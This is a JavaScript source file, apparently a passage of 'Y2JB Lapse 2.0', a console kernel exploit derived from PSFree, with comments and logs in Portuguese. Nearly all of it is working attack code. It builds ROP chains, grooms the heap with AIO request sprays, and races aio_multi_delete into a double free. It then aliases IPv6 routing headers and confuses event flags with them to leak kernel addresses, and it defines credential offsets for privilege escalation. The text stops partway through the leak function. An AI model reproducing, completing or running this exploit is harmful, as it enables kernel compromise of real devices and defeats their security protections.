/*
    Copyright (C) 2025 Gezine
    Copyright (C) 2025 anonymous
    
    This file `lapse.js` contains a derivative work of `lapse.mjs`, which is a
    part of PSFree.

    Source:
    https://github.com/shahrilnet/remote_lua_loader/blob/main/payloads/lapse.lua
    https://github.com/Al-Azif/psfree-lapse/tree/v1.5.0
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as
    published by the Free Software Foundation, either version 3 of the
    License, or (at your option) any later version.
    
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.
    
    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

(async function() {
    try {
        const lapse_version = "Y2JB Lapse 2.0 by Gezine";
        
        let failcheck_path;

        const MAIN_CORE = 4;
        const MAIN_RTPRIO = 0x100;
        const NUM_WORKERS = 2;
        const NUM_GROOMS = 0x200;
        const NUM_HANDLES = 0x100;
        const NUM_SDS = 64;
        const NUM_SDS_ALT = 48;
        const NUM_RACES = 100;
        const NUM_ALIAS = 100;
        const LEAK_LEN = 16;
        const NUM_LEAKS = 16;
        const NUM_CLOBBERS = 8;
        const MAX_AIO_IDS = 0x80;

        SYSCALL.pipe = 0x2an;
        SYSCALL.unlink = 0xan;
        SYSCALL.socketpair = 0x87n;
        SYSCALL.thr_self = 0x1b0n;
        SYSCALL.thr_exit = 0x1afn;
        SYSCALL.sched_yield = 0x14bn;
        SYSCALL.thr_new = 0x1c7n;
        SYSCALL.cpuset_getaffinity = 0x1e7n;
        SYSCALL.cpuset_setaffinity = 0x1e8n;
        SYSCALL.rtprio_thread = 0x1d2n;
        SYSCALL.evf_create = 0x21an;
        SYSCALL.evf_delete = 0x21bn;
        SYSCALL.evf_set = 0x220n;
        SYSCALL.evf_clear = 0x221n;
        SYSCALL.thr_suspend_ucontext = 0x278n;
        SYSCALL.thr_resume_ucontext = 0x279n;
        SYSCALL.aio_multi_delete = 0x296n;
        SYSCALL.aio_multi_wait = 0x297n;
        SYSCALL.aio_multi_poll = 0x298n;
        SYSCALL.aio_multi_cancel = 0x29an;
        SYSCALL.aio_submit_cmd = 0x29dn;
        SYSCALL.getpid = 0x14n;

        const AF_UNIX = 1n;
        const AF_INET = 2n;
        const AF_INET6 = 28n;
        const SOCK_STREAM = 1n;
        const SOCK_DGRAM = 2n;
        const SOL_SOCKET = 0xffffn;
        const SO_REUSEADDR = 4n;
        const SO_LINGER = 0x80n;
        
        const IPPROTO_TCP = 6n;
        const IPPROTO_UDP = 17n;
        const IPPROTO_IPV6 = 41n;
        const INADDR_ANY = 0n;
        
        const TCP_INFO = 0x20n;
        const size_tcp_info = 0xecn
        
        const TCPS_ESTABLISHED = 4n;
        
        const IPV6_2292PKTOPTIONS = 25n;
        const IPV6_PKTINFO = 46n;
        const IPV6_NEXTHOP = 48n;
        const IPV6_RTHDR = 51n;
        const IPV6_TCLASS = 61n;
        
        const AIO_CMD_READ = 1n;
        const AIO_CMD_FLAG_MULTI = 0x1000n;
        const AIO_CMD_MULTI_READ = 0x1001n;
        const AIO_CMD_WRITE = 2n;
        const AIO_STATE_COMPLETE = 3n;
        const AIO_STATE_ABORTED = 4n;        
        
        const SCE_KERNEL_ERROR_ESRCH = 0x80020003n;
        
        const RTP_SET = 1n;
        const PRI_REALTIME = 2n;

        const KERNEL_PID = 0n;
        const ROOTVNODE_OFFSET = 0x8n;
        const FILEDESCENT_SIZE = 0x30n;

        const F_SETFL    = 4n;
        const O_NONBLOCK = 4n;

        const OFFSET_UCRED_CR_SCEAUTHID = 0x58n;
        const OFFSET_UCRED_CR_SCECAPS = 0x60n;
        const OFFSET_UCRED_CR_SCEATTRS = 0x83n;
        const OFFSET_P_UCRED = 0x40n;
        const SYSCORE_AUTHID = 0x4800000000000007n;
        
        let block_fd = 0xffffffffffffffffn;
        let unblock_fd = 0xffffffffffffffffn;
        let block_id = -1n;
        let groom_ids = null;
        let sds = null;
        let sds_alt = null;
        let prev_core = -1;
        let prev_rtprio = 0n;
        let ready_signal = 0n;
        let deletion_signal = 0n;
        let pipe_buf = 0n;
        let setjmp_addr = 0n;
        let longjmp_addr = 0n;
        let saved_fpu_ctrl = 0;
        let saved_mxcsr = 0;

        function compare_version(a, b) {
            const [amaj, amin] = a.split('.').map(Number);
            const [bmaj, bmin] = b.split('.').map(Number);
            return amaj === bmaj ? amin - bmin : amaj - bmaj;
        }

        function wait_for(addr, threshold) {
            while (read64(addr) !== threshold) {
                nanosleep(1);
            }
        }

        function pin_to_core(core) {
            const mask = malloc(0x10);
            write32(mask, BigInt(1 << core));
            syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, -1n, 0x10n, mask);
        }

        function get_core_index(mask_addr) {
            let num = Number(read32(mask_addr));
            let position = 0;
            while (num > 0) {
                num = num >>> 1;
                position++;
            }
            return position - 1;
        }

        function get_current_core() {
            const mask = malloc(0x10);
            syscall(SYSCALL.cpuset_getaffinity, 3n, 1n, -1n, 0x10n, mask);
            return get_core_index(mask);
        }

        function set_rtprio(prio) {
            const rtprio = malloc(0x4);
            write16(rtprio, PRI_REALTIME);
            write16(rtprio + 2n, BigInt(prio));
            syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, rtprio);
        }

        function get_rtprio() {
            const rtprio = malloc(0x4);
            write16(rtprio, PRI_REALTIME);
            write16(rtprio + 2n, 0n);
            syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, rtprio);
            return read16(rtprio + 0x2n);
        }

        function new_socket() {
            const sd = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
            if (sd === 0xffffffffffffffffn) {
                throw new Error("erro em new_socket: " + toHex(sd));
            }
            return sd
        }

        function new_tcp_socket() {
            const sd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
            if (sd === 0xffffffffffffffffn) {
                throw new Error("erro em new_tcp_socket: " + toHex(sd));
            }            
            return sd
        }

        function set_sockopt(sd, level, optname, optval, optlen) {
            const result = syscall(SYSCALL.setsockopt, BigInt(sd), level, optname, optval, BigInt(optlen));
            if (result === 0xffffffffffffffffn) {
                throw new Error("erro em set_sockopt: " + toHex(result));
            }
            return result;
        }

        function get_sockopt(sd, level, optname, optval, optlen) {
            const len_ptr = malloc(4);
            write32(len_ptr, BigInt(optlen));
            const result = syscall(SYSCALL.getsockopt, BigInt(sd), level, optname, optval, len_ptr);
            if (result === 0xffffffffffffffffn) {
                throw new Error("erro em get_sockopt: " + toHex(result));
            }
            return read32(len_ptr);
        }

        function set_rthdr(sd, buf, len) {
            return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
        }

        function get_rthdr(sd, buf, max_len) {
            return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
        }

        function free_rthdrs(sds) {
            for (let i = 0; i < sds.length; i++) {
                if (sds[i] !== 0xffffffffffffffffn) {
                    set_sockopt(sds[i], IPPROTO_IPV6, IPV6_RTHDR, 0n, 0);
                }
            }
        }

        function build_rthdr(buf, size) {
            const len = ((Number(size) >> 3) - 1) & ~1;
            const actual_size = (len + 1) << 3;
            write8(buf, 0n);
            write8(buf + 1n, BigInt(len));
            write8(buf + 2n, 0n);
            write8(buf + 3n, BigInt(len >> 1));
            return actual_size;
        }

        function aton(ip_str) {
            const parts = ip_str.split('.').map(Number);
            return (parts[3] << 24) | (parts[2] << 16) | (parts[1] << 8) | parts[0];
        }

        function aio_submit_cmd(cmd, reqs, num_reqs, priority, ids) {
            const result = syscall(SYSCALL.aio_submit_cmd, cmd, reqs, BigInt(num_reqs), priority, ids);
            if (result === 0xffffffffffffffffn) {
                throw new Error("erro em aio_submit_cmd: " + toHex(result));
            }
            return result;
        }

        function aio_multi_delete(ids, num_ids, states) {
            const result = syscall(SYSCALL.aio_multi_delete, ids, BigInt(num_ids), states);
            if (result === 0xffffffffffffffffn) {
                throw new Error("erro em aio_multi_delete: " + toHex(result));
            }
            return result;
        }

        function aio_multi_poll(ids, num_ids, states) {
            const result = syscall(SYSCALL.aio_multi_poll, ids, BigInt(num_ids), states);
            if (result === 0xffffffffffffffffn) {
                throw new Error("erro em aio_multi_poll: " + toHex(result));
            }
            return result;
        }

        function aio_multi_cancel(ids, num_ids, states) {
            const result = syscall(SYSCALL.aio_multi_cancel, ids, BigInt(num_ids), states);
            if (result === 0xffffffffffffffffn) {
                throw new Error("erro em aio_multi_cancel: " + toHex(result));
            }
            return result;
        }
        
        function aio_multi_wait(ids, num_ids, states, mode, timeout) {
            const result = syscall(SYSCALL.aio_multi_wait, ids, BigInt(num_ids), states, BigInt(mode), timeout);
            if (result === 0xffffffffffffffffn) {
                throw new Error("erro em aio_multi_wait: " + toHex(result));
            }
            return result;
        }
        
        function make_reqs1(num_reqs) {
            const reqs = malloc(0x28 * num_reqs);
            for (let i = 0; i < num_reqs; i++) {
                write32(reqs + BigInt(i * 0x28 + 0x20), -1n);
            }
            return reqs;
        }
        
        function spray_aio(loops, reqs, num_reqs, ids, multi, cmd) {
            loops = loops || 1;
            cmd = cmd || AIO_CMD_READ;
            if (multi === undefined) multi = true;

            const step = 4 * (multi ? num_reqs : 1);
            const final_cmd = cmd | (multi ? AIO_CMD_FLAG_MULTI : 0n);

            for (let i = 0; i < loops; i++) {
                aio_submit_cmd(final_cmd, reqs, num_reqs, 3n, ids + BigInt(i * step));
            }
        }

        function cancel_aios(ids, num_ids) {
            const len = MAX_AIO_IDS;
            const rem = num_ids % len;
            const num_batches = Math.floor((num_ids - rem) / len);

            const errors = malloc(4 * len);

            for (let i = 0; i < num_batches; i++) {
                aio_multi_cancel(ids + BigInt(i * 4 * len), len, errors);
            }

            if (rem > 0) {
                aio_multi_cancel(ids + BigInt(num_batches * 4 * len), rem, errors);
            }
        }

        function free_aios(ids, num_ids, do_cancel) {
            if (do_cancel === undefined) do_cancel = true;

            const len = MAX_AIO_IDS;
            const rem = num_ids % len;
            const num_batches = Math.floor((num_ids - rem) / len);

            const errors = malloc(4 * len);

            for (let i = 0; i < num_batches; i++) {
                const addr = ids + BigInt(i * 4 * len);
                if (do_cancel) {
                    aio_multi_cancel(addr, len, errors);
                }
                aio_multi_poll(addr, len, errors);
                aio_multi_delete(addr, len, errors);
            }

            if (rem > 0) {
                const addr = ids + BigInt(num_batches * 4 * len);
                if (do_cancel) {
                    aio_multi_cancel(addr, rem, errors);
                }
                aio_multi_poll(addr, rem, errors);
                aio_multi_delete(addr, rem, errors);
            }
        }

        function free_aios2(ids, num_ids) {
            free_aios(ids, num_ids, false);
        }
        
        function call_suspend_chain_rop(pipe_write_fd, pipe_buf, thr_tid) {
            let rop_i = 0;
            
            // write(pipe_write_fd, pipe_buf, 1)
            rop_chain[rop_i++] = ROP.pop_rax; // pop rax ; ret
            rop_chain[rop_i++] = SYSCALL.write;
            rop_chain[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
            rop_chain[rop_i++] = pipe_write_fd;
            rop_chain[rop_i++] = ROP.pop_rsi; // pop rsi ; ret
            rop_chain[rop_i++] = pipe_buf;
            rop_chain[rop_i++] = ROP.pop_rdx; // pop rdx ; ret
            rop_chain[rop_i++] = 1n;
            rop_chain[rop_i++] = syscall_wrapper;
            
            rop_chain[rop_i++] = ROP.pop_rax; // pop rax ; ret
            rop_chain[rop_i++] = SYSCALL.sched_yield;
            rop_chain[rop_i++] = syscall_wrapper;
            
            rop_chain[rop_i++] = ROP.pop_rax; // pop rax ; ret
            rop_chain[rop_i++] = SYSCALL.thr_suspend_ucontext;
            rop_chain[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
            rop_chain[rop_i++] = thr_tid;
            rop_chain[rop_i++] = syscall_wrapper;
            
            rop_chain[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
            rop_chain[rop_i++] = return_value_addr;
            rop_chain[rop_i++] = ROP.mov_qword_rdi_rax; // mov qword [rdi], rax ; ret
            
            // Retorna um valor marcado seguro para o JavaScript
            rop_chain[rop_i++] = ROP.mov_rax_0x200000000; // mov rax, 0x200000000 ; ret
            rop_chain[rop_i++] = ROP.pop_rbp; // pop rbp ; ret
            rop_chain[rop_i++] = saved_fp;
            rop_chain[rop_i++] = ROP.mov_rsp_rbp; // mov rsp, rbp ; pop rbp ; ret
            
            return pwn(fake_frame);
        }

        function call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid) {
            const bc_start = get_bytecode_addr() + 0x36n;
            
            write64(bc_start, 0xAB0025n);
            saved_fp = addrof(call_suspend_chain_rop(pipe_write_fd, pipe_buf, thr_tid)) + 0x1n;
            
            write64(bc_start, 0xAB00260325n);
            call_suspend_chain_rop(pipe_write_fd, pipe_buf, thr_tid);
            
            return return_value_buf[0];
        }
        
        function init_threading() {
            setjmp_addr = libc_base + 0x58F80n;
            longjmp_addr = libc_base + 0x58FD0n;
            
            const jmpbuf = malloc(0x60);
            call(setjmp_addr, jmpbuf);
            
            saved_fpu_ctrl = Number(read32(jmpbuf + 0x40n));
            saved_mxcsr = Number(read32(jmpbuf + 0x44n));
        }

        function spawn_thread(rop_chain_race1_array) {
            const rop_chain_race1_addr = get_backing_store(rop_chain_race1_array);
            
            const jmpbuf = malloc(0x60);
            
            write64(jmpbuf + 0x00n, ROP.ret);      // endereço de retorno (RIP)
            write64(jmpbuf + 0x10n, rop_chain_race1_addr);             // RSP - pivota para rop_chain_race1
            write32(jmpbuf + 0x40n, BigInt(saved_fpu_ctrl));   // palavra de controle da FPU
            write32(jmpbuf + 0x44n, BigInt(saved_mxcsr));      // MXCSR
            
            const stack_size = 0x400n;
            const tls_size = 0x40n;
            
            const thr_new_args = malloc(0x80);
            const tid_addr = malloc(0x8);
            const cpid = malloc(0x8);
            const stack = malloc(Number(stack_size));
            const tls = malloc(Number(tls_size));
            
            write64(thr_new_args + 0x00n, longjmp_addr);       // start_func = longjmp
            write64(thr_new_args + 0x08n, jmpbuf);             // arg = jmpbuf
            write64(thr_new_args + 0x10n, stack);              // base da pilha
            write64(thr_new_args + 0x18n, stack_size);         // tamanho da pilha
            write64(thr_new_args + 0x20n, tls);                // base do TLS
            write64(thr_new_args + 0x28n, tls_size);           // tamanho do TLS
            write64(thr_new_args + 0x30n, tid_addr);           // child_tid (saída)
            write64(thr_new_args + 0x38n, cpid);               // parent_tid (saída)
            
            const result = syscall(SYSCALL.thr_new, thr_new_args, 0x68n);
            
            if (result !== 0n) {
                throw new Error("thr_new falhou: " + toHex(result));
            }
            
            const tid = read64(tid_addr);
            return tid;
        }
        
        async function setup() {
            try {
                init_threading();

                ready_signal = malloc(8);
                deletion_signal = malloc(8);
                pipe_buf = malloc(8);
                write64(ready_signal, 0n);
                write64(deletion_signal, 0n);

                prev_core = get_current_core();
                prev_rtprio = get_rtprio();

                pin_to_core(MAIN_CORE);
                set_rtprio(MAIN_RTPRIO);

                await log("Fixado no core " + get_current_core() + " com prioridade " + MAIN_RTPRIO);

                const sockpair = malloc(8);
                if (syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sockpair) !== 0n) {
                    return false;
                }

                block_fd = read32(sockpair);
                unblock_fd = read32(sockpair + 4n);
                await log("Socketpair criado: block_fd=" + block_fd + " unblock_fd=" + unblock_fd);

                const block_reqs = malloc(0x28 * NUM_WORKERS);
                for (let i = 0; i < NUM_WORKERS; i++) {
                    const offset = i * 0x28;
                    write32(block_reqs + BigInt(offset + 0x08), 1n);
                    write32(block_reqs + BigInt(offset + 0x20), block_fd);
                }

                const block_id_buf = malloc(4);
                if (aio_submit_cmd(AIO_CMD_READ, block_reqs, NUM_WORKERS, 3n, block_id_buf) !== 0n) {
                    return false;
                }

                block_id = read32(block_id_buf);
                await log("Workers de AIO bloqueados com ID: " + block_id);
                
                const num_reqs = 3;
                const groom_reqs = make_reqs1(num_reqs);
                const groom_ids_addr = malloc(4 * NUM_GROOMS);
                
                spray_aio(NUM_GROOMS, groom_reqs, num_reqs, groom_ids_addr, false);
                cancel_aios(groom_ids_addr, NUM_GROOMS);
                
                groom_ids = [];
                for (let i = 0; i < NUM_GROOMS; i++) {
                    groom_ids.push(Number(read32(groom_ids_addr + BigInt(i * 4))));
                }
                
                sds = [];
                for (let i = 0; i < NUM_SDS; i++) {
                    sds.push(new_socket());
                }
                
                sds_alt = [];
                for (let i = 0; i < NUM_SDS_ALT; i++) {
                    sds_alt.push(new_socket());
                }
                
                return true;

            } catch (e) {
                await log("Falha na configuração: " + e.message);
                return false;
            }
        }
        
        async function double_free_reqs2() {
            try {
                const server_addr = malloc(16);
                write8(server_addr + 1n, AF_INET);
                write16(server_addr + 2n, 0n);
                write32(server_addr + 4n, BigInt(aton("127.0.0.1")));

                const sd_listen = new_tcp_socket();

                const enable = malloc(4);
                write32(enable, 1n);
                set_sockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, enable, 4);

                if (syscall(SYSCALL.bind, sd_listen, server_addr, 16n) !== 0n) {
                    await log("falha no bind");
                    syscall(SYSCALL.close, sd_listen);
                    return null;
                }

                const addr_len = malloc(4);
                write32(addr_len, 16n);
                if (syscall(SYSCALL.getsockname, sd_listen, server_addr, addr_len) !== 0n) {
                    await log("falha no getsockname");
                    syscall(SYSCALL.close, sd_listen);
                    return null;
                }
                await log("Vinculado à porta: " + Number(read16(server_addr + 2n)));

                if (syscall(SYSCALL.listen, sd_listen, 1n) !== 0n) {
                    await log("falha no listen");
                    syscall(SYSCALL.close, sd_listen);
                    return null;
                }
                
                const num_reqs = 3;
                const which_req = num_reqs - 1;
                const reqs = make_reqs1(num_reqs);
                const aio_ids = malloc(4 * num_reqs);
                const req_addr = aio_ids + BigInt(which_req * 4);
                const errors = malloc(4 * num_reqs);
                const cmd = AIO_CMD_MULTI_READ;

                for (let attempt = 1; attempt <= NUM_RACES; attempt++) {
                    await log("Tentativa de race " + attempt + "/" + NUM_RACES);

                    const sd_client = new_tcp_socket();

                    if (syscall(SYSCALL.connect, sd_client, server_addr, 16n) !== 0n) {
                        syscall(SYSCALL.close, sd_client);
                        continue;
                    }

                    const sd_conn = syscall(SYSCALL.accept, sd_listen, 0n, 0n);

                    const linger_buf = malloc(8);
                    write32(linger_buf, 1n);
                    write32(linger_buf + 4n, 1n);
                    set_sockopt(sd_client, SOL_SOCKET, SO_LINGER, linger_buf, 8);
                    
                    write32(reqs + BigInt(which_req * 0x28 + 0x20), sd_client);
                    
                    if (aio_submit_cmd(cmd, reqs, num_reqs, 3n, aio_ids) !== 0n) {
                        syscall(SYSCALL.close, sd_client);
                        syscall(SYSCALL.close, sd_conn);
                        continue;
                    }

                    aio_multi_cancel(aio_ids, num_reqs, errors);
                    aio_multi_poll(aio_ids, num_reqs, errors);
                    
                    syscall(SYSCALL.close, sd_client);

                    const sd_pair = await race_one(req_addr, sd_conn, sds);
                    
                    aio_multi_delete(aio_ids, num_reqs, errors);
                    syscall(SYSCALL.close, sd_conn);

                    if (sd_pair !== null) {
                        await log("Race vencida na tentativa " + attempt);
                        syscall(SYSCALL.close, sd_listen);
                        return sd_pair;
                    }
                }

                syscall(SYSCALL.close, sd_listen);
                return null;

            } catch (e) {
                await log("Erro no estágio 1: " + e.message);
                return null;
            }
        }

        async function race_one(req_addr, tcp_sd, sds) {
            try {
                write64(ready_signal, 0n);
                write64(deletion_signal, 0n);

                const sce_errs = malloc(8);
                write32(sce_errs, -1n);
                write32(sce_errs + 4n, -1n);

                const [pipe_read_fd, pipe_write_fd] = create_pipe();
                
                const rop_chain_race1 = new BigUint64Array(200);
                
                // rop_chain_race1[0] será sobrescrito pelo longjmp, então é ignorado
                let rop_i = 1;

                const cpu_mask = malloc(0x10);
                write16(cpu_mask, BigInt(1 << MAIN_CORE));
                
                // Fixa no core
                rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                rop_chain_race1[rop_i++] = SYSCALL.cpuset_setaffinity;
                rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
                rop_chain_race1[rop_i++] = 3n;
                rop_chain_race1[rop_i++] = ROP.pop_rsi; // pop rsi ; ret
                rop_chain_race1[rop_i++] = 1n;
                rop_chain_race1[rop_i++] = ROP.pop_rdx; // pop rdx ; ret
                rop_chain_race1[rop_i++] = -1n;
                rop_chain_race1[rop_i++] = ROP.pop_rcx; // pop rcx ; ret
                rop_chain_race1[rop_i++] = 0x10n;
                rop_chain_race1[rop_i++] = ROP.pop_r8; // pop r8 ; ret
                rop_chain_race1[rop_i++] = cpu_mask;
                rop_chain_race1[rop_i++] = syscall_wrapper;

                const rtprio_buf = malloc(4);
                write16(rtprio_buf, PRI_REALTIME);
                write16(rtprio_buf + 2n, BigInt(MAIN_RTPRIO));

                // Define a prioridade
                rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                rop_chain_race1[rop_i++] = SYSCALL.rtprio_thread;
                rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
                rop_chain_race1[rop_i++] = 1n;
                rop_chain_race1[rop_i++] = ROP.pop_rsi; // pop rsi ; ret
                rop_chain_race1[rop_i++] = 0n;
                rop_chain_race1[rop_i++] = ROP.pop_rdx; // pop rdx ; ret
                rop_chain_race1[rop_i++] = rtprio_buf;
                rop_chain_race1[rop_i++] = syscall_wrapper;

                // Sinaliza pronto
                rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
                rop_chain_race1[rop_i++] = ready_signal;
                rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                rop_chain_race1[rop_i++] = 1n;
                rop_chain_race1[rop_i++] = ROP.mov_qword_rdi_rax; // mov qword [rdi], rax ; ret
                
                // Lê do pipe (bloqueia aqui)
                rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                rop_chain_race1[rop_i++] = SYSCALL.read;
                rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
                rop_chain_race1[rop_i++] = pipe_read_fd;
                rop_chain_race1[rop_i++] = ROP.pop_rsi; // pop rsi ; ret
                rop_chain_race1[rop_i++] = pipe_buf;
                rop_chain_race1[rop_i++] = ROP.pop_rdx; // pop rdx ; ret
                rop_chain_race1[rop_i++] = 1n;
                rop_chain_race1[rop_i++] = syscall_wrapper;

                // deleta multi AIO
                rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                rop_chain_race1[rop_i++] = SYSCALL.aio_multi_delete;
                rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
                rop_chain_race1[rop_i++] = req_addr;
                rop_chain_race1[rop_i++] = ROP.pop_rsi; // pop rsi ; ret
                rop_chain_race1[rop_i++] = 1n;
                rop_chain_race1[rop_i++] = ROP.pop_rdx; // pop rdx ; ret
                rop_chain_race1[rop_i++] = sce_errs + 4n;
                rop_chain_race1[rop_i++] = syscall_wrapper;

                // Sinaliza exclusão
                rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
                rop_chain_race1[rop_i++] = deletion_signal;
                rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                rop_chain_race1[rop_i++] = 1n;
                rop_chain_race1[rop_i++] = ROP.mov_qword_rdi_rax; // mov qword [rdi], rax ; ret

                // Saída da thread
                rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                rop_chain_race1[rop_i++] = SYSCALL.thr_exit;
                rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
                rop_chain_race1[rop_i++] = 0n;
                rop_chain_race1[rop_i++] = syscall_wrapper;

                const thr_tid = spawn_thread(rop_chain_race1);
                
                wait_for(ready_signal, 1n);
                
                const suspend_res = call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid);
                
                await log("Resultado do suspend: " + toHex(suspend_res));

                const poll_err = malloc(4);
                aio_multi_poll(req_addr, 1, poll_err);
                const poll_res = read32(poll_err);
                await log("Poll após o suspend: " + toHex(poll_res));

                const info_buf = malloc(0x100);
                const info_size = get_sockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf, 0x100);
                
                if (info_size !== size_tcp_info) {
                    await log("tamanho de info diferente de " + size_tcp_info + ": " + info_size);
                }
                
                const tcp_state = read8(info_buf);
                await log("tcp_state: " + toHex(tcp_state));
                
                let won_race = false;

                if (poll_res !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
                    aio_multi_delete(req_addr, 1, sce_errs);
                    won_race = true;
                    await log("Race vencida!");
                } else {
                    await log("Race não vencida (poll_res=" + toHex(poll_res) + " tcp_state=" + toHex(tcp_state) + ")");
                }

                const resume_result = syscall(SYSCALL.thr_resume_ucontext, thr_tid);
                await log("Resume " + toHex(thr_tid) + ": " + resume_result);
                
                wait_for(deletion_signal, 1n);

                if (won_race) {
                    const err_main_thr = read32(sce_errs);
                    const err_worker_thr = read32(sce_errs + 4n);
                    await log("sce_errs: main=" + toHex(err_main_thr) + " worker=" + toHex(err_worker_thr));

                    if (err_main_thr === err_worker_thr && err_main_thr === 0n) {
                        await log("Double-free bem-sucedido, criando rthdrs aliasados...");
                        const sd_pair = await make_aliased_rthdrs(sds);
                        
                        if (sd_pair !== null) {
                            syscall(SYSCALL.close, pipe_read_fd);
                            syscall(SYSCALL.close, pipe_write_fd);
                            return sd_pair;
                        } else {
                            await log("Falha ao criar rthdrs aliasados");
                        }
                    } else {
                        await log("sce_errs divergente - race falhou");
                    }
                }

                syscall(SYSCALL.close, pipe_read_fd);
                syscall(SYSCALL.close, pipe_write_fd);
                return null;

            } catch (e) {
                await log("Erro na race: " + e.message);
                await log(e.stack);
                return null;
            }
        }

        async function make_aliased_rthdrs(sds) {
            const marker_offset = 4;
            const size = 0x80;
            const buf = malloc(size);
            const rsize = build_rthdr(buf, size);

            for (let loop = 1; loop <= NUM_ALIAS; loop++) {
                for (let i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
                    const sd = Number(sds[i-1]);
                    if (sds[i-1] !== 0xffffffffffffffffn) {
                        write32(buf + BigInt(marker_offset), BigInt(i));
                        set_rthdr(sd, buf, rsize);
                    }
                }

                for (let i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
                    const sd = Number(sds[i-1]);
                    if (sds[i-1] !== 0xffffffffffffffffn) {
                        get_rthdr(sd, buf, size);
                        const marker = Number(read32(buf + BigInt(marker_offset)));
                        
                        if (marker !== i && marker > 0 && marker <= NUM_SDS) {
                            const aliased_idx = marker - 1;
                            const aliased_sd = Number(sds[aliased_idx]);
                            if (aliased_idx >= 0 && aliased_idx < sds.length && sds[aliased_idx] !== 0xffffffffffffffffn) {
                                await log("rthdrs aliasados na tentativa: " + loop);

                                const sd_pair = [sd, aliased_sd];
                                const max_idx = Math.max(i-1, aliased_idx);
                                const min_idx = Math.min(i-1, aliased_idx);
                                sds.splice(max_idx, 1);
                                sds.splice(min_idx, 1);
                                free_rthdrs(sds);
                                sds.push(new_socket());
                                sds.push(new_socket());
                                return sd_pair;
                            }
                        }
                    }
                }
            }
            return null;
        }
        
        function new_evf(name, flags) {
            const result = syscall(SYSCALL.evf_create, name, 0n, flags);
            if (result === 0xffffffffffffffffn) {
                throw new Error("erro em evf_create: " + toHex(result));
            }
            return result;
        }

        function set_evf_flags(id, flags) {
            let result = syscall(SYSCALL.evf_clear, id, 0n);
            if (result === 0xffffffffffffffffn) {
                throw new Error("erro em evf_clear: " + toHex(result));
            }
            result = syscall(SYSCALL.evf_set, id, flags);
            if (result === 0xffffffffffffffffn) {
                throw new Error("erro em evf_set: " + toHex(result));
            }
            return result;
        }

        function free_evf(id) {
            const result = syscall(SYSCALL.evf_delete, id);
            if (result === 0xffffffffffffffffn) {
                throw new Error("erro em evf_delete: " + toHex(result));
            }
            return result;
        }

        function verify_reqs2(addr, cmd) {
            if (read32(addr) !== cmd) {
                return false;
            }

            const heap_prefixes = [];

            for (let i = 0x10n; i <= 0x20n; i += 8n) {
                if (read16(addr + i + 6n) !== 0xffffn) {
                    return false;
                }
                heap_prefixes.push(Number(read16(addr + i + 4n)));
            }

            const state1 = Number(read32(addr + 0x38n));
            const state2 = Number(read32(addr + 0x3cn));
            if (!(state1 > 0 && state1 <= 4) || state2 !== 0) {
                return false;
            }

            if (read64(addr + 0x40n) !== 0n) {
                return false;
            }

            for (let i = 0x48n; i <= 0x50n; i += 8n) {
                if (read16(addr + i + 6n) === 0xffffn) {
                    if (read16(addr + i + 4n) !== 0xffffn) {
                        heap_prefixes.push(Number(read16(addr + i + 4n)));
                    }
                } else if (i === 0x50n || read64(addr + i) !== 0n) {
                    return false;
                }
            }

            if (heap_prefixes.length < 2) {
                return false;
            }

            const first_prefix = heap_prefixes[0];
            for (let idx = 1; idx < heap_prefixes.length; idx++) {
                if (heap_prefixes[idx] !== first_prefix) {
                    return false;
                }
            }

            return true;
        }

        async function leak_kernel_addrs(sd_pair, sds) {
            
            const sd = sd_pair[0];
            const buflen = 0x80 * LEAK_LEN;
            const buf = malloc(buflen);

            await log("Confundindo evf com rthdr...");

            const name = malloc(1);

            syscall(SYSCALL.close, BigInt(sd_pair[1]));

            let evf = null;
            for (let i = 1; i <= NUM_ALIAS; i++) {
                const evfs = [];

                for (let j = 1; j <= NUM_HANDLES; j++) {
                    const evf_flags = 0xf00n | (BigInt(j) << 16n);
                    evfs.push(new_evf(name, evf_flags));
                }

                get_rthdr(sd, buf, 0x80);

                const flag = Number(read32(buf));

                if ((flag & 0xf00) === 0xf00) {
                    const idx = (flag >>> 16) & 0xffff;
                    const expected_flag = BigInt(flag | 1);

                    evf = evfs[idx - 1];

                    set_evf_flags(evf, expected_flag);
                    get_rthdr(sd, buf, 0x80);

                    const val = read32(buf);
